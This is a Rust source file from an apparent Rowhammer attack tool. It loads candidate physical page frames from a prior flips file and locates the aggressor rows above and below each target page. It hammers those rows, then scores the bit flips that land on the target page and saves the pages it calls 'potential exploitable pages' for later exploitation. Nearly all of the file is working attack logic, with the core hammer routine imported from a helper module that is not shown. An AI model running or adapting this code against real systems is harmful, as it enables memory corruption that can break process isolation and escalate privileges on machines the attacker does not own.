use std::{
    fs::{create_dir, File},
    io::{self, BufRead, BufReader, Write},
    path::Path,
    thread,
    time::{self, Instant},
};

use crate::profiler::utils::{
    self, collect_pages_by_row, count_flips_by_bit, fill_memory, rowhammer, setup_mapping, Page,
    PageData, Row,
};

const TEST_ITERATIONS: u32 = 10;
const RISK_THRESHOLD: u32 = 0;
const SCORE_THRESHOLD: u32 = 3;
const CANDIDATES_THRESHOLD: f64 = 0.9;

#[derive(Debug)]
pub(crate) struct PageCandidate {
    pub(crate) target_page: Page,
    pub(crate) above_pages: (Page, Page),
    pub(crate) below_pages: (Page, Page),

    pub(crate) score: u32,
}

impl PageCandidate {
    pub(crate) fn new(
        target_page: Page,
        above_pages: (Page, Page),
        below_pages: (Page, Page),
    ) -> Self {
        let target_flips = target_page.data.as_ref().unwrap().flips;

        Self {
            target_page,
            above_pages,
            below_pages,

            score: Self::calculate_score(&target_flips),
        }
    }

    /// Calculates the score of the PageCandidate
    pub(crate) fn calculate_score(flips: &[u64]) -> u32 {
        let position_bonus = 10;
        let score = (flips[8] + 1) as u32 * position_bonus;

        score
    }
}

/// Calculates the risk score of a page based on the uppermost 8 bits per halfword
fn calculate_risk_score(flips: &[u64]) -> u32 {
    let mut risk_score = 0;
    let max_position = 9;

    for (i, bit) in flips[max_position..].iter().enumerate() {
        risk_score += i as u64 * bit;
    }

    risk_score as u32
}

fn find_page(pages: &[Page], page_nbr: u64) -> Option<&Page> {
    pages.iter().find(|page| page.pfn == page_nbr)
}

fn setup_page_candidate(
    pages_by_row: &[Row],
    pfn: u64,
    above_pfns: (u64, u64),
    below_pfns: (u64, u64),
    target_flips: [u64; utils::MAX_BITS],
) -> Result<PageCandidate, &'static str> {
    // Find the rows that contains the target pages
    for index in 0..pages_by_row.len() - 2 {
        let above_row_index = index;
        let target_row_index = index + 1;
        let below_row_index = index + 2;

        let above_row = &pages_by_row[above_row_index];
        let target_row = &pages_by_row[target_row_index];
        let below_row = &pages_by_row[below_row_index];

        let Some(target_page) = find_page(&target_row[..], pfn) else {
            continue;
        };
        let Some(above_page1) = find_page(&above_row[..], above_pfns.0) else {
            continue;
        };
        let Some(above_page2) = find_page(&above_row[..], above_pfns.1) else {
            continue;
        };
        let Some(below_page1) = find_page(&below_row[..], below_pfns.0) else {
            continue;
        };
        let Some(below_page2) = find_page(&below_row[..], below_pfns.1) else {
            continue;
        };

        let mut target_page = target_page.clone();

        // If pages are found, create a PageCandidate
        target_page.data = Some(PageData::new(above_pfns, below_pfns, target_flips));
        let page_candidate = PageCandidate::new(
            target_page,
            (above_page1.clone(), above_page2.clone()),
            (below_page1.clone(), below_page2.clone()),
        );

        return Ok(page_candidate);
    }

    Err("Pages not found in mapping")
}

/// Output the PageCandidate to a file
fn output_page(page_candidate: &PageCandidate) -> io::Result<()> {
    let mut path = std::env::current_dir()?;

    if !path.join("data").exists() {
        create_dir(path.join("data"))?;
    }

    path.push(format!(
        "data/V_{:#x}",
        page_candidate.target_page.pfn as u64
    ));
    path.set_extension("out");
    println!("PATH: {:#?}", path);

    let mut file = File::create(path)?;

    let flips = page_candidate
        .target_page
        .data
        .as_ref()
        .expect("Flips should be defined at this stage")
        .flips;

    let width = 12;
    file.write_all(
        format!(
            "\t{:<width$}{:<width$}{:<width$}{:<width$}{:<width$}{:<7}{}\n",
            "Page", "aPFN1", "aPFN2", "bPFN1", "bPFN2", "Score", "Flipped bits"
        )
        .as_bytes(),
    )?;
    file.write_all(
        format!(
            ">\t{:<#width$x}{:<#width$x}{:<#width$x}{:<#width$x}{:<#width$x}{:<7}{:?}",
            page_candidate.target_page.pfn,
            page_candidate.above_pages.0.pfn,
            page_candidate.above_pages.1.pfn,
            page_candidate.below_pages.0.pfn,
            page_candidate.below_pages.1.pfn,
            page_candidate.score,
            flips,
        )
        .as_bytes(),
    )?;

    Ok(())
}

fn get_candidate_pfns(input_path: impl AsRef<Path>) -> Vec<(u64, (u64, u64), (u64, u64))> {
    let mut pfns = Vec::new();
    let file = File::open(input_path).expect("Failed to open file {path}");

    for line in BufReader::new(file).lines() {
        let line = line.expect("Error when reading line in file");
        // If line doesn't start with '>' it doesn't contain any data
        if !line.starts_with(">") {
            continue;
        }

        let start_flips = line.find("[").unwrap();
        let end_flips = line.find("]").unwrap_or(line.len());
        let flips = &line[start_flips + 1..end_flips]
            .split(",")
            .map(|s| {
                s.trim()
                    .parse::<u64>()
                    .expect("Invalid format when parsing flip array")
            })
            .collect::<Vec<_>>();

        let score = flips[8];
        let risk_score: u64 = flips[9..].iter().sum();

        // Skip pages with low score or high risk score
        if score < SCORE_THRESHOLD as u64 || risk_score > RISK_THRESHOLD as u64 {
            continue;
        }

        // First 5 values (after skipping the initial '>') are the PFNs
        let p = line[1..]
            .split_whitespace()
            .take(5)
            .map(|s| {
                u64::from_str_radix(
                    match s.strip_prefix("0x") {
                        Some(s) => s,
                        None => s,
                    },
                    16,
                )
                .expect("Failed to parse hexstring in input file to u64")
            })
            .collect::<Vec<_>>();

        pfns.push((p[0], (p[1], p[2]), (p[3], p[4])));
    }
    pfns
}

/// Read the flips.out file and return a vector of potential exploitable pages
pub(crate) fn get_candidate_pages(
    pages_by_row: &[Row],
    candidate_pfns: &[(u64, (u64, u64), (u64, u64))],
) -> Vec<PageCandidate> {
    candidate_pfns
        .iter()
        .filter_map(|(pfn, above_pfns, below_pfns)| {
            match setup_page_candidate(
                pages_by_row,
                *pfn,
                *above_pfns,
                *below_pfns,
                [0; utils::MAX_BITS],
            ) {
                Ok(page_candidate) => Some(page_candidate),
                Err(_) => None,
            }
        })
        .collect()
}

fn profile_candidate_pages(page_candidates: &mut [PageCandidate]) {
    println!("Profiling {} Page Candidates", page_candidates.len());

    'candidate_loop: for candidate in page_candidates {
        println!("Testing candidate: {:#?}", candidate.target_page.pfn);

        let target_page = &candidate.target_page;
        let above_pages = &candidate.above_pages;
        let below_pages = &candidate.below_pages;

        unsafe {
            fill_memory(
                target_page.virt_addr,
                above_pages.0.virt_addr,
                below_pages.0.virt_addr,
            );
            fill_memory(
                target_page.virt_addr,
                above_pages.1.virt_addr,
                below_pages.1.virt_addr,
            );
        }

        let mut risk_score = 0;
        let mut score = 0;

        let mut hammer_flips = [0; utils::MAX_BITS];

        for _ in 0..TEST_ITERATIONS {
            thread::sleep(time::Duration::from_millis(100));

            let before = Instant::now();
            for _ in 0..TEST_ITERATIONS {
                rowhammer(above_pages.0.virt_addr, below_pages.0.virt_addr);
            }
            println!("Time: {:#?}", before.elapsed() / TEST_ITERATIONS);

            let flips = count_flips_by_bit(&target_page, 0x0);

            score += PageCandidate::calculate_score(&flips);
            risk_score += calculate_risk_score(&flips);

            if risk_score > RISK_THRESHOLD {
                println!(
                    "Risk score too high, skipping candidate {:#?}",
                    candidate.target_page.pfn
                );
                continue 'candidate_loop;
            }

            println!("Flips: {:?}", flips);
            for index in 0..hammer_flips.len() {
                hammer_flips[index] += flips[index];
            }

            unsafe {
                std::ptr::write_bytes(target_page.virt_addr, 0x00, utils::PAGE_SIZE);
            }
        }

        candidate.target_page.data.as_mut().unwrap().flips = hammer_flips;

        candidate.score = score;

        println!(
            "Candidate got score: {:#?}, risk score: {:#?}",
            candidate.score, risk_score
        );

        if candidate.score > 100 {
            println!("Good page found: {:#?}", candidate.target_page.pfn);
            output_page(&candidate).expect("Failed to output page");
        }
    }
}

pub(crate) fn main(dimms: u8) {
    let mut fraction_of_phys_memory = 0.0;
    let row_size = 128 * 1024 * dimms as usize;
    let mut mmap = setup_mapping(0.0);
    let candidate_pfns = get_candidate_pfns("flips.out");

    println!("number of pfns in flips.out: {}", candidate_pfns.len());
    let result = loop {
        fraction_of_phys_memory += 0.1;

        if fraction_of_phys_memory > 0.95 {
            break None;
        }

        println!(
            "Setting up memory mapping with {} of physical memory",
            fraction_of_phys_memory
        );

        // Drop the old mapping in order to create a new one
        std::mem::drop(mmap);
        mmap = setup_mapping(fraction_of_phys_memory);

        println!("Collecting pages from mapping...");

        let pages_by_row = match collect_pages_by_row(&mut mmap, row_size) {
            Ok(pages_by_row) => {
                if pages_by_row.len() < 3 {
                    println!("Not enough rows in mapping, got {}", pages_by_row.len());
                    continue;
                }
                pages_by_row
            }
            Err(e) => {
                println!("Couldn't collect pages from mapping, got {:#?}", e);
                continue;
            }
        };

        println!("Finding candidate pages...");
        let candidates = get_candidate_pages(&pages_by_row, &candidate_pfns);

        if (candidates.len() as f64 / candidate_pfns.len() as f64) < CANDIDATES_THRESHOLD {
            println!(
                "Not enough candidates found, got {}/{}",
                candidates.len(),
                candidate_pfns.len(),
            );
            continue;
        }

        break Some(candidates);
    };

    let mut candidates = match result {
        Some(mut candidates) => {
            println!(
                "Found {} candidates at frac: {}",
                candidates.len(),
                fraction_of_phys_memory
            );
            candidates.sort_by(|a, b| a.score.cmp(&b.score));

            candidates
        }
        None => {
            println!("No candidates found");
            return;
        }
    };

    profile_candidate_pages(&mut candidates);
}
